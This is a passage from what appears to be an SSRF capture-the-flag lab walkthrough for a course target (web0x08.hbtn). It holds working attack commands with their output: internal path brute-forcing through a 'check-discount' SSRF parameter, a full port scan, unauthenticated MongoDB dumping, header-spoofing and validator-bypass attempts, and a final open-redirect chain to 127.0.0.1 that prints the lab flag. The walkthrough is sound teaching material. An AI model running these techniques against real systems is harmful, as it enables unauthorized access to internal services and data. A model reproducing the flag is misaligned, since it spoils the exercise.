ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"

# Forbidden---
# HTTP/1.1 301 Moved Permanently
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 22:16:43 GMT
# Content-Type: text/html
# Content-Length: 169
# Location: http://web0x08.hbtn/app4-2/
# Connection: keep-alive
#
# <html>
# <head><title>301 Moved Permanently</title></head>
# <body>
# <center><h1>301 Moved Permanently</h1></center>
# <hr><center>nginx/1.18.0</center>
# </body>
# </html>
```

Found it — `/app4-2/` returns the exact same `403 Forbidden` signature (identical ETag) as the IP-gated admin routes, confirming it's a sibling backend app behind the same origin-restriction. Let's now target it through the SSRF (`check-discount`'s `articleApi`), since that's proven to bypass this exact IP gate.

**Step 30 — SSRF into `/app4-2/` and its likely sub-paths**

```bash
for p in "/app4-2/" "/app4-2/admin" "/app4-2/admin/list-of-items" "/app4-2/check-discount" "/app4-2/product/1" "/app4-2/check-reduction"; do
  echo "=== $p ==="
  curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "articleApi=http://web0x08.hbtn${p}"
  echo
  echo
done
```


**Output:**

```bash
for p in "/app4-2/" "/app4-2/admin" "/app4-2/admin/list-of-items" "/app4-2/check-discount" "/app4-2/product/1" "/app4-2/check-reduction"; do
  echo "=== $p ==="
  curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "articleApi=http://web0x08.hbtn${p}"
  echo
  echo
done

# === /app4-2/ ===
# No discount.
#
# === /app4-2/admin ===
# No discount.
#
# === /app4-2/admin/list-of-items ===
# No discount.
#
# === /app4-2/check-discount ===
# No discount.
#
# === /app4-2/product/1 ===
# No discount.
#
# === /app4-2/check-reduction ===
# No discount.
```

All still "No discount." — confirms `check-discount` is a content-blind oracle no matter the target; it can reach anywhere but never reflects data back. We need a different path into `app4-2`. Let's check if `app4-2` is blocked entirely, or only specific sub-paths (like `app4-1`, where product pages were public but `/admin` was gated).

**Step 31 — Probe `app4-2` sub-paths directly (not via SSRF)**

```bash
for p in "/app4-2/" "/app4-2/product/1" "/app4-2/check-discount" "/app4-2/check-stock" "/app4-2/check-reduction" "/app4-2/js/main.js" "/app4-2/admin" "/app4-2/admin/dashboard" "/app4-2/admin/list-of-items"; do
  code=$(curl -sS -o /tmp/resp.txt -w '%{http_code}' "http://web0x08.hbtn${p}")
  size=$(wc -c < /tmp/resp.txt)
  echo "$p -> $code (size=$size)"
done
```

Paste back the full output — looking for any path that returns `200` (or anything other than `403`) directly.

**Output:**

```bash
for p in "/app4-2/" "/app4-2/product/1" "/app4-2/check-discount" "/app4-2/check-stock" "/app4-2/check-reduction" "/app4-2/js/main.js" "/app4-2/admin" "/app4-2/admin/dashboard" "/app4-2/admin/list-of-items"; do
  code=$(curl -sS -o /tmp/resp.txt -w '%{http_code}' "http://web0x08.hbtn${p}")
  size=$(wc -c < /tmp/resp.txt)
  echo "$p -> $code (size=$size)"
done

# /app4-2/ -> 403 (size=9)
# /app4-2/product/1 -> 403 (size=9)
# /app4-2/check-discount -> 403 (size=9)
# /app4-2/check-stock -> 403 (size=9)
# /app4-2/check-reduction -> 403 (size=9)
# /app4-2/js/main.js -> 403 (size=9)
# /app4-2/admin -> 403 (size=9)
# /app4-2/admin/dashboard -> 403 (size=9)
# /app4-2/admin/list-of-items -> 403 (size=9)
```

Given that `check-discount`'s SSRF seems to always land on the same simplistic stub (port 8080's wildcard "No discount." handler, with IP-filtering shared across `/admin`, `/app4-2`, and direct port 8080 access — all identical 403 signature), let's step back and do a direct port scan against the sandbox itself. This will tell us definitively what's actually listening externally, rather than guessing paths.

**Step 32 — Port scan the sandbox**

```bash
nmap -p- --min-rate 1000 -T4 web0x08.hbtn
```

(If that's slow or unavailable, a faster common-ports scan works too: `nmap -p 1-10000 web0x08.hbtn`)


**Output:**

```bash
nmap -p- --min-rate 1000 -T4 web0x08.hbtn

# Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-10 17:25 -0500
# Nmap scan report for web0x08.hbtn (10.42.58.85)
# Host is up (0.018s latency).
# rDNS record for 10.42.58.85: internal-api.checkstock.shop
# Not shown: 65528 closed tcp ports (reset)
# PORT      STATE SERVICE
# 80/tcp    open  http
# 3000/tcp  open  ppp
# 3001/tcp  open  nessus
# 3002/tcp  open  exlm-agent
# 3003/tcp  open  cgms
# 8080/tcp  open  http-proxy
# 27017/tcp open  mongod

# Nmap done: 1 IP address (1 host up) scanned in 14.58 seconds
```

Great — the scan reveals ports **3000, 3001, 3002, 3003** are all open (the first three match tasks 0/1/2's internal ports), plus **8080** and **27017** (MongoDB). Port **3003** is new and fits the sequential pattern perfectly — very likely this task's actual internal service, distinct from the 8080 decoy stub.

**Step 33 — Probe port 3003 directly and via SSRF**

```bash
echo "=== direct access ==="
curl -sS -i 'http://web0x08.hbtn:3003/' | head -n 20
echo
curl -sS -i 'http://web0x08.hbtn:3003/admin/list-of-items'
echo
echo "=== via check-discount SSRF ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:3003/admin/list-of-items' \
  -w '\n[size=%{size_download}]\n'
```


**Output:**

```bash
echo "=== direct access ==="
curl -sS -i 'http://web0x08.hbtn:3003/' | head -n 20
echo
curl -sS -i 'http://web0x08.hbtn:3003/admin/list-of-items'
echo
echo "=== via check-discount SSRF ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:3003/admin/list-of-items' \
  -w '\n[size=%{size_download}]\n'

# === direct access ===
# HTTP/1.1 200 OK
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 133592
# ETag: W/"209d8-Z8V/w7Yx1Xwg22QimqmvtGrAPb0"
# Date: Tue, 10 Nov 2026 22:32:52 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# <!DOCTYPE html>
# <html lang="en">
#   <head>
#     <meta charset="UTF-8" />
#     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" /# >
#     <meta name="format-detection" content="telephone=no" />
#     <title>Exclusive Shop</title>
#
#     <link
#       href="https://fonts.googleapis.com/css?family=PT+Serif:400,400i,700,700ii%7CRoboto:300,300i,400,400i,500,500i,700,700i,900,900i&amp;subset=cyrillic"


# HTTP/1.1 404 Not Found
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
# Date: Tue, 10 Nov 2026 22:32:52 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# 404: Page Not Found
# === via check-discount SSRF ===
# No discount.
# [size=12]
```


Big development — port **3003** is directly reachable with **no restrictions at all** (200 OK, full shop homepage, no 403/IP-gate), unlike the 8080 service. The `check-discount` SSRF still only shows "No discount." when targeting it (further confirming it's hardcoded/stuck to port 8080 internally and ignores whatever port we specify — a deliberate restriction, not something we can bypass through that endpoint). But since port 3003 is openly reachable, we don't need SSRF at all here — let's just explore it directly.

**Step 34 — Map admin paths on port 3003 directly**

```bash
for p in "/admin" "/admin/dashboard" "/admin/list-of-items" "/app4-1/admin" "/app4-1/admin/dashboard" "/app4-1/admin/list-of-items" "/app4-1/check-discount" "/check-discount"; do
  code=$(curl -sS -o /tmp/resp.txt -w '%{http_code}' "http://web0x08.hbtn:3003${p}")
  size=$(wc -c < /tmp/resp.txt)
  echo "$p -> $code (size=$size)"
done
```


**Output:**

```bash
for p in "/admin" "/admin/dashboard" "/admin/list-of-items" "/app4-1/admin" "/app4-1/admin/dashboard" "/app4-1/admin/list-of-items" "/app4-1/check-discount" "/check-discount"; do
  code=$(curl -sS -o /tmp/resp.txt -w '%{http_code}' "http://web0x08.hbtn:3003${p}")
  size=$(wc -c < /tmp/resp.txt)
  echo "$p -> $code (size=$size)"
done

# /admin -> 404 (size=19)
# /admin/dashboard -> 404 (size=19)
# /admin/list-of-items -> 404 (size=19)
# /app4-1/admin -> 404 (size=19)
# /app4-1/admin/dashboard -> 404 (size=19)
# /app4-1/admin/list-of-items -> 404 (size=19)
# /app4-1/check-discount -> 404 (size=19)
# /check-discount -> 404 (size=19)
```

Port 3003 turned out to be an unrelated static copy (all 404 on business routes) — a red herring from the shared sandbox. Let's reconsider "**backend services**" more literally: the scan also revealed **MongoDB on port 27017**, directly reachable from our box. That's a very classic "other backend service" to check for exposure (unauthenticated DB access).

**Step 35.a — Install mongodb client**

Install mongodb.

```bash
# 1. Download the latest mongosh .deb package
wget https://downloads.mongodb.com/compass/mongodb-mongosh_2.3.3_amd64.deb

# 2. Install the package locally using apt (this will handle any dependencies automatically)
sudo apt install ./mongodb-mongosh_2.3.3_amd64.deb

# 3. Clean up the downloaded file
rm mongodb-mongosh_2.3.3_amd64.deb
```




**Step 35.b — Test unauthenticated access, in Kali terminal**

```bash
which mongosh mongo 2>/dev/null
mongosh --host web0x08.hbtn --port 27017 --eval "db.adminCommand('listDatabases')" --quiet 2>&1
```


**Output:**

```bash
which mongosh mongo 2>/dev/null
mongosh --host web0x08.hbtn --port 27017 --eval "db.adminCommand('listDatabases')" --quiet 2>&1

# /usr/bin/mongosh
# /usr/bin/mongo
# {
#   databases: [
#     { name: 'admin', sizeOnDisk: Long('40960'), empty: false },
#     { name: 'config', sizeOnDisk: Long('73728'), empty: false },
#     { name: 'local', sizeOnDisk: Long('40960'), empty: false },
#     {
#       name: 'ssrf-open-redirect-lab',
#       sizeOnDisk: Long('40960'),
#       empty: false
#     }
#   ],
#   totalSize: Long('196608'),
#   totalSizeMb: Long('0'),
#   ok: 1
# }
```

Jackpot — unauthenticated MongoDB access, and there's a database literally named `ssrf-open-redirect-lab`. Let's dig into it.

**Step 36 — List collections and dump their contents**

```bash
mongosh --host web0x08.hbtn --port 27017 --quiet --eval "
db = db.getSiblingDB('ssrf-open-redirect-lab');
print('Collections:', JSON.stringify(db.getCollectionNames()));
db.getCollectionNames().forEach(c => {
  print('--- ' + c + ' ---');
  printjson(db.getCollection(c).find().toArray());
});
"
```


**Output:**

```bash
mongosh --host web0x08.hbtn --port 27017 --quiet --eval "
db = db.getSiblingDB('ssrf-open-redirect-lab');
print('Collections:', JSON.stringify(db.getCollectionNames()));
db.getCollectionNames().forEach(c => {
  print('--- ' + c + ' ---');
  printjson(db.getCollection(c).find().toArray());
});
"

Collections: ["products"]
--- products ---
[
  {
    _id: 1,
    name: 'Sample Product 1',
    description: 'This is a sample product.',
    price: 9.99,
    __v: 0
  },
  {
    _id: 2,
    name: 'Sample Product 2',
    description: 'This is a sample product.',
    price: 9.99,
    __v: 0
  },
  {
    _id: 3,
    name: 'Sample Product 3',
    description: 'This is a sample product.',
    price: 9.99,
    __v: 0
  },
  {
    _id: 4,
    name: 'Sample Product 4',
    description: 'This is a sample product.',
    price: 9.99,
    __v: 0
  },
  {
    _id: 5,
    name: 'Sample Product 5',
    description: 'This is a sample product.',
    price: 9.99,
    __v: 0
  }
]

```

No flag in that collection — just the product catalog backing `app4-1`. Let's check the other databases too, in case the flag's tucked away somewhere unexpected.

**Step 37 — Enumerate all databases' collections**

```bash
mongosh --host web0x08.hbtn --port 27017 --quiet --eval "
db.getMongo().getDBNames().forEach(dbName => {
  let d = db.getSiblingDB(dbName);
  print('=== ' + dbName + ' ===');
  print(JSON.stringify(d.getCollectionNames()));
});
"
```


**Output:**

```bash
mongosh --host web0x08.hbtn --port 27017 --quiet --eval "
db.getMongo().getDBNames().forEach(dbName => {
  let d = db.getSiblingDB(dbName);
  print('=== ' + dbName + ' ===');
  print(JSON.stringify(d.getCollectionNames()));
});
"

=== admin ===
["system.version"]
=== config ===
["system.sessions"]
=== local ===
["startup_log"]
=== ssrf-open-redirect-lab ===
["products"]
```


MongoDB came up empty (just the product catalog) — that was a worthwhile check but a dead end for the flag itself. Let's go back to brute-forcing the admin service more broadly, since we haven't tried many plausible route names on the port-8080 service.

**Step 38 — Broader path brute-force via SSRF on the 8080 service**

```bash
for p in "/flag" "/secret" "/stock" "/inventory" "/users" "/items" "/admin/items" "/admin/users" "/admin/flag" "/admin/stock" "/api/admin" "/api/admin/items" "/discount" "/admin/discount" "/stockApi" "/check-stock"; do
  echo "=== $p ==="
  curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "articleApi=http://web0x08.hbtn:8080${p}"
  echo
done
```


**Output:**

```bash
for p in "/flag" "/secret" "/stock" "/inventory" "/users" "/items" "/admin/items" "/admin/users" "/admin/flag" "/admin/stock" "/api/admin" "/api/admin/items" "/discount" "/admin/discount" "/stockApi" "/check-stock"; do
  echo "=== $p ==="
  curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "articleApi=http://web0x08.hbtn:8080${p}"
  echo
done

# === /flag ===
# No discount.
# === /secret ===
# No discount.
# === /stock ===
# No discount.
# === /inventory ===
# No discount.
# === /users ===
# No discount.
# === /items ===
# No discount.
# === /admin/items ===
# No discount.
# === /admin/users ===
# No discount.
# === /admin/flag ===
# No discount.
# === /admin/stock ===
# No discount.
# === /api/admin ===
# No discount.
# === /api/admin/items ===
# No discount.
# === /discount ===
# No discount.
# === /admin/discount ===
# No discount.
# === /stockApi ===
# No discount.
# === /check-stock ===
# No discount.
```

Let's rule out one possibility before going further: nginx-level caching could explain why every different `articleApi` value produces byte-identical output. Let's check for cache headers.

**Step 39 — Check for caching artifacts**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cache-Control: no-cache' \
  --data-urlencode "articleApi=http://web0x08.hbtn:8080/totally-unique-test-$(date +%s)"
```


**Output:**

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cache-Control: no-cache' \
  --data-urlencode "articleApi=http://web0x08.hbtn:8080/totally-unique-test-$(date +%s)"

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 23:13:03 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```

Let's test whether visiting `nextProduct` first establishes some session/cookie trust that the admin check honors — i.e., actually walk through the intended user flow (hit the redirect feature, keep cookies, then hit admin) rather than treating them as isolated requests.

**Step 40 — Chain nextProduct → admin with a cookie jar**

```bash
rm -f /tmp/cookies.txt
echo "=== Step A: hit nextProduct, save any cookies ==="
curl -sS -i -c /tmp/cookies.txt 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/admin/list-of-items'
echo
echo "=== Cookie jar contents ==="
cat /tmp/cookies.txt
echo
echo "=== Step B: use saved cookies to hit /admin/list-of-items ==="
curl -sS -i -b /tmp/cookies.txt 'http://web0x08.hbtn/admin/list-of-items'
```


**Output:**

```bash
rm -f /tmp/cookies.txt
echo "=== Step A: hit nextProduct, save any cookies ==="
curl -sS -i -c /tmp/cookies.txt 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/admin/list-of-items'
echo
echo "=== Cookie jar contents ==="
cat /tmp/cookies.txt
echo
echo "=== Step B: use saved cookies to hit /admin/list-of-items ==="
curl -sS -i -b /tmp/cookies.txt 'http://web0x08.hbtn/admin/list-of-items'

# === Step A: hit nextProduct, save any cookies ===
# HTTP/1.1 302 Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 23:14:47 GMT
# Content-Type: text/plain; charset=utf-8
# Content-Length: 42
# Connection: keep-alive
# X-Powered-By: Express
# Location: /admin/list-of-items
# Vary: Accept
#
# Found. Redirecting to /admin/list-of-items
# === Cookie jar contents ===
# # Netscape HTTP Cookie File
# # https://curl.se/docs/http-cookies.html
# # This file was generated by libcurl! Edit at your own risk.
#
#
# === Step B: use saved cookies to hit /admin/list-of-items ===
# HTTP/1.1 403 Forbidden
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 23:14:47 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
#
# Forbidden
```


Let's test something we haven't tried: whether the hostname allowlist for `check-discount` includes the internal domains from the EARLIER tasks (`internal-api.shop.com`, `discount.newshop.tn`) — since those services are still running (ports 3000-3002 are open per our nmap scan), maybe the validator's allowlist is broader than just `web0x08.hbtn`.

**Step 41 — Test earlier tasks' internal hostnames against the validator**

```bash
echo "=== internal-api.shop.com ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://internal-api.shop.com:3000/admin/list-of-items'

echo "=== discount.newshop.tn ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://discount.newshop.tn:3002/admin/list-of-items'
```


**Output:**

```bash
echo "=== internal-api.shop.com ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://internal-api.shop.com:3000/admin/list-of-items'

echo "=== discount.newshop.tn ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://discount.newshop.tn:3002/admin/list-of-items'

# === internal-api.shop.com ===
# Invalid hostname=== discount.newshop.tn ===
# Invalid hostname
```


Let's check what a plain GET to the `check-discount` endpoint itself reveals (not the product page — the actual endpoint), in case it exposes something we haven't seen (debug info, a different default, etc.).

**Step 42 — GET the check-discount endpoint directly**

```bash
curl -sS -i 'http://web0x08.hbtn/app4-1/check-discount'
```

Also, let's test the IPv6 loopback notation for completeness (low probability given the strict-equality pattern we've found, but cheap to check), and verify there isn't a trailing-slash or encoding quirk on the hostname check:

```bash
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn./admin/list-of-items'
```


**Output:**

```bash
curl -sS -i 'http://web0x08.hbtn/app4-1/check-discount'

# HTTP/1.1 404 Not Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 23:18:41 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
#
# 404: Page Not Found


curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn./admin/list-of-items'

# Invalid hostname
```

Let's check your own VPN-assigned IP, and then try spoofing `X-Forwarded-For` with addresses in the server's own subnet (not just `127.0.0.1`) — maybe the filter trusts the local subnet rather than strictly loopback, and we tested the wrong spoofed value.

**Step 43 — Check your VPN IP and test subnet-based spoofing**

```bash
ip -4 addr show tun0 2>/dev/null || ip -4 addr show | grep -A2 'tun\|ppp'
```

```bash
for ip in "10.42.58.1" "10.42.58.85" "10.42.0.1" "10.42.254.214"; do
  echo "=== X-Forwarded-For: $ip ==="
  curl -sS -o /dev/null -w '%{http_code}\n' 'http://web0x08.hbtn/admin/list-of-items' -H "X-Forwarded-For: $ip"
done
```


Let's test a different hypothesis suggested by the lab's own naming ("ssrf-open-redirect-lab"): maybe `nextProduct` itself performs an internal validation fetch before redirecting (not just a blind 302), which would be a genuinely different SSRF primitive. We can detect this by timing — if it tries to connect to an unreachable address internally, the request should hang/timeout rather than respond instantly.

**Step 44 — Time-test `nextProduct` for internal fetch behavior**

```bash
echo "=== Normal (fast) baseline ==="
time curl -sS -o /dev/null 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/product/2'

echo "=== Unreachable target (would hang if nextProduct validates server-side) ==="
time curl -sS -o /dev/null --max-time 10 'http://web0x08.hbtn/app4-1/product/nextProduct?path=http://10.255.255.1:81/test'
```

The `real` time shown: if the second one takes noticeably longer (several seconds, timing out near our `--max-time`), that confirms server-side validation is happening.

**Output:**

```bash
echo "=== Normal (fast) baseline ==="
time curl -sS -o /dev/null 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/product/2'

echo "=== Unreachable target (would hang if nextProduct validates server-side) ==="
time curl -sS -o /dev/null --max-time 10 'http://web0x08.hbtn/app4-1/product/nextProduct?path=http://10.255.255.1:81/test'

# === Normal (fast) baseline ===
#
# real    0.06s
# user    0.00s
# sys     0.01s
# cpu     14%
# === Unreachable target (would hang if nextProduct validates server-side) ===
#
# real    0.06s
# user    0.00s
# sys     0.01s
# cpu     20%
```

Given everything points to `nextProduct` being a pure client-side redirect (no server-side validation, confirmed by timing) and `check-discount` being content-blind no matter what it reaches, let's try a different angle: check for leaked config/source files on the public site that might reveal the real route names or internal structure.

**Step 45 — Check for leaked files**

```bash
for p in "/robots.txt" "/sitemap.xml" "/package.json" "/.git/config" "/.env" "/server.js" "/app.js" "/.git/HEAD"; do
  code=$(curl -sS -o /tmp/leak.txt -w '%{http_code}' "http://web0x08.hbtn${p}")
  size=$(wc -c < /tmp/leak.txt)
  echo "$p -> $code (size=$size)"
  if [ "$code" = "200" ]; then cat /tmp/leak.txt; echo; fi
done
```


**Output:**

```bash
for p in "/robots.txt" "/sitemap.xml" "/package.json" "/.git/config" "/.env" "/server.js" "/app.js" "/.git/HEAD"; do
  code=$(curl -sS -o /tmp/leak.txt -w '%{http_code}' "http://web0x08.hbtn${p}")
  size=$(wc -c < /tmp/leak.txt)
  echo "$p -> $code (size=$size)"
  if [ "$code" = "200" ]; then cat /tmp/leak.txt; echo; fi
done

# /robots.txt -> 404 (size=19)
# /sitemap.xml -> 404 (size=19)
# /package.json -> 404 (size=19)
# /.git/config -> 404 (size=19)
# /.env -> 404 (size=19)
# /server.js -> 404 (size=19)
# /app.js -> 404 (size=19)
# /.git/HEAD -> 404 (size=19)
```

Let's check whether successfully hitting the admin area via SSRF causes a side-effect we can observe in MongoDB (like a log entry or a new collection), since the HTTP response itself won't show us content.

**Step 46 — Trigger SSRF to admin paths, then recheck MongoDB for new data**

```bash
echo "=== Trigger SSRF to admin paths ==="
for p in "/admin/list-of-items" "/admin" "/app4-2/" "/app4-2/admin/list-of-items"; do
  curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "articleApi=http://web0x08.hbtn:8080${p}" > /dev/null
done

echo "=== Recheck all databases/collections ==="
mongosh --host web0x08.hbtn --port 27017 --quiet --eval "
db.getMongo().getDBNames().forEach(dbName => {
  let d = db.getSiblingDB(dbName);
  print('=== ' + dbName + ' ===');
  print(JSON.stringify(d.getCollectionNames()));
});
"
```


**Output:**

```bash
echo "=== Trigger SSRF to admin paths ==="
for p in "/admin/list-of-items" "/admin" "/app4-2/" "/app4-2/admin/list-of-items"; do
  curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "articleApi=http://web0x08.hbtn:8080${p}" > /dev/null
done

echo "=== Recheck all databases/collections ==="
mongosh --host web0x08.hbtn --port 27017 --quiet --eval "
db.getMongo().getDBNames().forEach(dbName => {
  let d = db.getSiblingDB(dbName);
  print('=== ' + dbName + ' ===');
  print(JSON.stringify(d.getCollectionNames()));
});
"

=== Trigger SSRF to admin paths ===
=== Recheck all databases/collections ===
=== admin ===
["system.version"]
=== config ===
["system.sessions"]
=== local ===
["startup_log"]
=== ssrf-open-redirect-lab ===
["products"]
```


One more quick test to fully rule out naive string-matching (vs proper URL parsing) in the hostname validator — using a decoy domain that contains "web0x08.hbtn" as a substring but isn't actually that host.

**Step 47 — Test naive substring-check bypass**

```bash
echo "=== substring in query string ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://example.com/?x=web0x08.hbtn'

echo "=== substring as path ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://example.com/web0x08.hbtn'

echo "=== hostname with extra prefix ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://notweb0x08.hbtn/'
```


**Output:**

```bash
echo "=== substring in query string ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://example.com/?x=web0x08.hbtn'

echo "=== substring as path ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://example.com/web0x08.hbtn'

echo "=== hostname with extra prefix ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://notweb0x08.hbtn/'

# === substring in query string ===
# Invalid hostname=== substring as path ===
# Invalid hostname=== hostname with extra prefix ===
# Invalid hostname
```

Let's try HTTP Parameter Pollution — sending `articleApi` twice. A common bug pattern: the hostname validator checks one occurrence while the actual fetch uses a different one (e.g., validates the first array element, fetches the last, or vice versa).

**Step 48 — Test parameter pollution on `articleApi`**

```bash
echo "=== valid first, malicious second ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'articleApi=http://web0x08.hbtn/&articleApi=http://127.0.0.1:8080/admin/list-of-items'

echo "=== malicious first, valid second ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'articleApi=http://127.0.0.1:8080/admin/list-of-items&articleApi=http://web0x08.hbtn/'

echo "=== bracket notation (array) ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'articleApi[]=http://web0x08.hbtn/&articleApi[]=http://127.0.0.1:8080/admin/list-of-items'
```


**Output:**

```bash
echo "=== valid first, malicious second ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'articleApi=http://web0x08.hbtn/&articleApi=http://127.0.0.1:8080/admin/list-of-items'

echo "=== malicious first, valid second ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'articleApi=http://127.0.0.1:8080/admin/list-of-items&articleApi=http://web0x08.hbtn/'

echo "=== bracket notation (array) ==="
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'articleApi[]=http://web0x08.hbtn/&articleApi[]=http://127.0.0.1:8080/admin/list-of-items'

# === valid first, malicious second ===
# No discount.=== malicious first, valid second ===
# Invalid hostname=== bracket notation (array) ===
# No discount.
```

<BR>

---

> **hints from [tomeq-d](https://github.com/tomeq-d/dlh-cyber_security/tree/master/web_application_security/0x08_ssrf)**

---

It's very close to what we tried, with two key differences:
- he hit `nextProduct` explicitly via port **8080** (not port 80)
- he redirected to `/admin` (not `/admin/list-of-items`)

**Step 49 — Replicate the cohort's exact payload**

Let's replicate his exact payload directly:

```bash
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=http://127.0.0.1:8080/admin'
```

**Output:**

```bash
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=http://127.0.0.1:8080/admin'

# <h1> The goal is achieved, well done.
# FLAG_3  0a8ace62416351f61e0535ea2d7b6d72 </h1>
```


🎉 That's it — the redirect **was** being followed; the key details we were missing were (1) hitting `nextProduct` through port 8080 explicitly rather than port 80, and (2) the target path being exactly `/admin` rather than `/admin/list-of-items`.

**FLAG_3:** `0a8ace62416351f61e0535ea2d7b6d72`

Now let's save it following the same pattern as the previous tasks:

```bash
echo '0a8ace62416351f61e0535ea2d7b6d72' > 3-flag.txt
git add .
git commit -m "3-flag.txt"
git push
```

It ended up being a genuine PortSwigger-style "SSRF via open redirect" bypass: the hostname allowlist only validated the *initial* `articleApi` URL, but once that URL pointed at the open-redirect feature (itself on the whitelisted host), the backend's fetch followed the 302 to the attacker-controlled `127.0.0.1:8080/admin` target without re-validating. The lesson being tested was exactly what the task description hinted at: "an allowed hostname doesn't make every redirect target safe."
